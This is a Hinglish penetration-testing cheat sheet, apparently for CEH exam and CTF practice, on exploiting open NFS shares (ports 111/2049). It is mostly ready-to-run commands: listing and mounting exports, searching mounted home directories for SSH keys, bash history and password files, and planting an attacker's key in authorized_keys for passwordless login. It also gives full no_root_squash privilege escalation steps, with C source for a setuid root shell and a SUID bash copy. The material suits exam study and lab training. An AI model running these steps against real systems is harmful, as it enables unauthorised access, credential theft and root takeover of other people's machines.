# NFS PORT OPEN (111/2049) — Ab Kya Karu?

---

## Pehle Samjho: NFS Kya Hai?

NFS = **Network File System**. Ye ek protocol hai jo network pe files share karne ke liye use hota hai.
Jaise tum apne computer pe ek folder share karte ho aur doosra computer usse access kar sakta hai — NFS wahi karta hai Linux/Unix mein.

**Key Facts:**
- Port **111 (TCP/UDP)** = **rpcbind/portmapper** — ye NFS ka "receptionist" hai, batata hai ki NFS service kis port pe chal rahi hai
- Port **2049 (TCP/UDP)** = actual NFS service
- NFS mostly Linux/Unix systems pe milta hai
- NFS mein authentication BAHUT WEAK hoti hai — bas IP address based hoti hai!
- CEH exam mein NFS = **shares dhundo → mount karo → files padho → privesc karo**

**Real life analogy:** NFS = ek open almirah (cupboard) jo network pe hai. Koi bhi aa ke files padh sakta hai agar permission sahi ho. Aur agar `no_root_squash` on hai, toh koi bhi root ban ke files daal sakta hai!

### NFS Kaise Kaam Karta Hai:
```
1. Server ek folder "export" karta hai (share karta hai)
   Example: /home/user ko network pe share kiya
2. Client us folder ko "mount" karta hai (apne system pe attach karta hai)
   Example: mount -t nfs server:/home/user /tmp/nfs
3. Ab client us folder ki files padh/likh sakta hai jaise apni hi files hon
```

### Important NFS Terms:
| Term              | Matlab                                                     |
|-------------------|-----------------------------------------------------------|
| Export            | Jo folder server ne share kiya hai                         |
| Mount             | Client pe us folder ko attach karna                        |
| showmount         | Dekhna ki server ne kya kya share kiya hai                 |
| no_root_squash    | ROOT user ki power remote access mein bhi BANI REHTI hai  |
| root_squash       | ROOT user ko "nobody" bana deta hai (safe)                 |

---

## STEP 1: Confirm NFS Open Hai

```bash
# Dono ports check karo
nmap -sV -p 111,2049 <IP>

# RPC services enumerate karo
rpcinfo -p <IP>
```

**Output mein kya dekho:**
- `111/tcp open rpcbind` — portmapper chal raha hai
- `2049/tcp open nfs` — NFS service chal rahi hai
- `rpcinfo` mein `nfs`, `mountd` dikhna chahiye

---

## STEP 2: Shares List Karo (showmount)

Ye SABSE PEHLA command hai NFS ke liye:

```bash
# Kya kya share kiya hai server ne?
showmount -e <IP>

# Nmap se bhi dekh sakte ho
nmap --script nfs-showmount,nfs-ls -p 111 <IP>

# Metasploit se
msfconsole -q
use auxiliary/scanner/nfs/nfsmount
set RHOSTS <IP>
run
```

**`showmount -e` flags explained:**
- `-e` = exports list dikhao (kya kya shared hai)
- `<IP>` = NFS server ka IP

**Output mein kya dekho:**
```
Export list for <IP>:
/home/user    *
/shared       *
/backup       192.168.1.0/24
```

**Output decode karo:**
- `/home/user *` = `/home/user` folder SABKE LIYE shared hai (* = everyone)
- `/shared *` = `/shared` folder bhi sabke liye open hai
- `/backup 192.168.1.0/24` = ye sirf specific subnet ke liye hai

**`*` ka matlab = koi bhi mount kar sakta hai = GOLDMINE!**

---

## STEP 3: Share Mount Karo — Files Browse Karo

Ab shared folder ko apne system pe attach karo:

```bash
# Pehle ek folder banao jahan mount karenge
mkdir /tmp/nfs_mount

# Mount karo
mount -t nfs <IP>:/home/user /tmp/nfs_mount
# Ya agar version specify karna ho:
mount -t nfs -o vers=3 <IP>:/home/user /tmp/nfs_mount

# Ab browse karo jaise normal folder
ls -la /tmp/nfs_mount/
```

**Flags explained:**
- `-t nfs` = filesystem type NFS hai
- `<IP>:/home/user` = server ka IP aur shared folder path
- `/tmp/nfs_mount` = local folder jahan mount hoga

**Mount ke baad kya karo:**
```bash
# Saari files dekho (hidden files bhi)
ls -la /tmp/nfs_mount/

# Flag ya sensitive files dhundo
find /tmp/nfs_mount/ -name "flag*" 2>/dev/null
find /tmp/nfs_mount/ -name "*.txt" 2>/dev/null
find /tmp/nfs_mount/ -name "*.conf" 2>/dev/null
find /tmp/nfs_mount/ -name "*.bak" 2>/dev/null

# SSH keys dhundo
find /tmp/nfs_mount/ -name "id_rsa*" 2>/dev/null
find /tmp/nfs_mount/ -name "authorized_keys" 2>/dev/null

# Password files
cat /tmp/nfs_mount/.bash_history
cat /tmp/nfs_mount/.bashrc
find /tmp/nfs_mount/ -name "*.password" -o -name "*.pass" 2>/dev/null

# Kaam ho jaaye toh unmount karo
umount /tmp/nfs_mount
```

**IMPORTANT:** Agar `mount` command error de "access denied" — try karo:
```bash
mount -t nfs -o nolock <IP>:/share /tmp/nfs_mount
mount -t nfs -o vers=2 <IP>:/share /tmp/nfs_mount
```

---

## STEP 4: SSH Key Plant Karo (Agar /home Share Mila)

Ye bahut powerful attack hai! Agar kisi user ki home directory shared hai:

```bash
# Step 1: Mount karo
mkdir /tmp/nfs_mount
mount -t nfs <IP>:/home/user /tmp/nfs_mount

# Step 2: .ssh folder banao (agar nahi hai)
mkdir -p /tmp/nfs_mount/.ssh

# Step 3: SSH key pair generate karo
ssh-keygen -t rsa -f /tmp/mykey -N ""
# -t rsa = RSA key type
# -f /tmp/mykey = key file ka naam
# -N "" = no passphrase (empty password for key)

# Step 4: Public key authorized_keys mein daalo
cat /tmp/mykey.pub >> /tmp/nfs_mount/.ssh/authorized_keys

# Step 5: Permissions set karo (ZAROORI hai!)
chmod 700 /tmp/nfs_mount/.ssh
chmod 600 /tmp/nfs_mount/.ssh/authorized_keys

# Step 6: Ab SSH se login karo bina password ke!
ssh -i /tmp/mykey user@<IP>
```

**Ye kaise kaam karta hai:**
1. NFS se user ki home directory accessible hai
2. Hum apni SSH public key uske `.ssh/authorized_keys` mein daal dete hain
3. Ab SSH server hamari private key ko verify karega aur bina password ke login kar dega
4. Basically, humne apna "digital lock ka copy key" bana liya!

**IMPORTANT:** Permissions (chmod) bahut zaroori hain! SSH strict permission check karta hai. Agar permissions sahi nahi hain toh login fail hoga.

---

## STEP 5: no_root_squash Privesc (BAHUT IMPORTANT!)

### Pehle samjho: no_root_squash kya hai?

Normally jab tum NFS share mount karte ho aur root ho, toh server tumhe "nobody" user bana deta hai
(ye safety feature hai — isse **root_squash** kehte hain).

**LEKIN** agar server pe `no_root_squash` set hai, toh tumhari root power remote access mein bhi
BANI REHTI HAI. Matlab tum root ke taur pe files create/modify kar sakte ho target pe!

### Kaise check karein:
```bash
# showmount ya nmap scripts mein export options dekho
# Agar "(rw,no_root_squash)" dikhe toh vulnerable hai

# /etc/exports file check karo (agar already target pe ho)
cat /etc/exports
# Output: /shared *(rw,sync,no_root_squash)
```

### Attack: SUID Binary Privesc

```bash
# Step 1: Mount karo (apne machine pe root se)
mkdir /tmp/nfs_attack
mount -t nfs <IP>:/shared /tmp/nfs_attack

# Step 2: C program likhho jo root shell de
cat > /tmp/nfs_attack/shell.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF

# Step 3: Compile karo
gcc /tmp/nfs_attack/shell.c -o /tmp/nfs_attack/rootshell

# Step 4: SUID bit set karo (ye no_root_squash ki wajah se kaam karega!)
chmod +s /tmp/nfs_attack/rootshell
chmod 4755 /tmp/nfs_attack/rootshell

# Step 5: Ab TARGET machine pe jaake execute karo:
/shared/rootshell
# ROOT SHELL mil jayega!
```

### Simpler Method (bash copy):
```bash
# Mount karo
mount -t nfs <IP>:/shared /tmp/nfs_attack

# Bash binary copy karo
cp /bin/bash /tmp/nfs_attack/bash_root

# SUID bit set karo
chmod +s /tmp/nfs_attack/bash_root

# Target pe execute karo:
/shared/bash_root -p
# -p flag ZAROORI hai! Bina -p ke bash SUID bit drop kar deta hai
```

**WHY ye kaam karta hai:**
1. no_root_squash = server root ki permissions allow karta hai
2. Hum SUID bit set karte hain binary pe (owner=root ki tarah execute hoga)
3. Koi bhi user jab ye binary execute karega → root shell milega!

---

## STEP 6: Nmap NFS Scripts

```bash
# Saare NFS scripts ek saath
nmap --script nfs-ls,nfs-showmount,nfs-statfs -p 111,2049 <IP>

# RPC info
nmap --script rpcinfo -p 111 <IP>
```

**nfs-ls** = shared files list karta hai
**nfs-showmount** = exports dikhata hai
**nfs-statfs** = filesystem stats (kitna space hai)

---

## Common Mistakes (Mat Karna Ye)

1. **`showmount` command nahi chala** — Kali mein install karo: `apt install nfs-common`

2. **Mount kiya lekin "access denied"** — Export sirf specific IP ke liye ho sakta hai. `*` wale shares pe try karo. Ya `-o nolock,vers=3` flags try karo.

3. **SSH key plant ki but login nahi ho raha** — Permissions check karo! `.ssh` folder = 700, `authorized_keys` = 600. Ye MUST hai.

4. **no_root_squash exploit mein root nahi** — Ye attack tab kaam karta hai jab TUM apne machine pe root ho. `sudo` use karo mount aur chmod ke liye.

5. **SUID binary mein `-p` flag bhool gaye** — Bash ko `-p` flag ZAROORI hai SUID mode mein. Bina iske bash automatically privileges drop kar deta hai.

6. **Unmount karna bhool gaye** — `umount /tmp/nfs_mount` karo kaam ke baad. Warna kabhi kabhi issues aate hain.

7. **Sirf port 2049 check kiya** — Port 111 (rpcbind) bhi check karo! Ye NFS ka gateway hai.

---

## Quick Decision Tree

```
Port 111/2049 Open (NFS) hai?
|
+-- showmount -e <IP>
|   (Kya kya shared hai dekho)
|   |
|   +-- Shares dikhe?
|   |   |
|   |   +-- /home/user share hai?
|   |   |   |
|   |   |   +-- YES --> SSH Key Attack!
|   |   |   |   mount karo --> .ssh/authorized_keys mein key daalo
|   |   |   |   ssh -i key user@<IP> --> LOGIN!
|   |   |   |
|   |   |   +-- NO --> Normal mount karo, files browse karo
|   |   |
|   |   +-- Mount karo: mount -t nfs <IP>:/share /tmp/nfs
|   |   |
|   |   +-- Files browse karo:
|   |   |   find /tmp/nfs/ -name "flag*"
|   |   |   find /tmp/nfs/ -name "*.txt"
|   |   |   find /tmp/nfs/ -name "id_rsa*"
|   |   |
|   |   +-- no_root_squash hai?
|   |       |
|   |       +-- YES --> SUID binary privesc!
|   |       |   cp /bin/bash /share/bash_root
|   |       |   chmod +s /share/bash_root
|   |       |   Target pe: /share/bash_root -p --> ROOT!
|   |       |
|   |       +-- NO --> Normal files padho, creds dhundo
|   |
|   +-- Kuch nahi dikha?
|       rpcinfo -p <IP> se check karo
|       nmap scripts try karo
```
